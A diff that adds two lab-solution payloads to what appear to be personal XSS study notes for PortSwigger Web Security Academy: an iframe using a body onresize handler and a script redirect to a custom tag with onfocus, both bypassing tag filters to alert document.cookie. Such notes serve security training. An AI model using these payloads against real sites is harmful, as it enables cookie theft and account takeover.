@@ -138,6 +138,15 @@ Some useful ways of executing JavaScript are:
 
                         
                         
+                              ## REFLECTIVE XSS INTO HTML WITH MOST TAG BLOCKED
+# <iframe src="https://your-lab-id.web-security-academy.net/?search=%22%3E%3Cbody%20onresize=alert(document.cookie)%3E" onload=this.style.width='100px'>
+
+                       
+                       ## REFLECTIVE XSS WHERE ALL THE TAGS ARE BLOCKED
+# <script>
+  location = 'https://your-lab-id.web-security-academy.net/?search=%3Cxss+id%3Dx+onfocus%3Dalert%28document.cookie%29%20tabindex=1%3E#x';
+  </script>                           
+                        
 
                           
                       
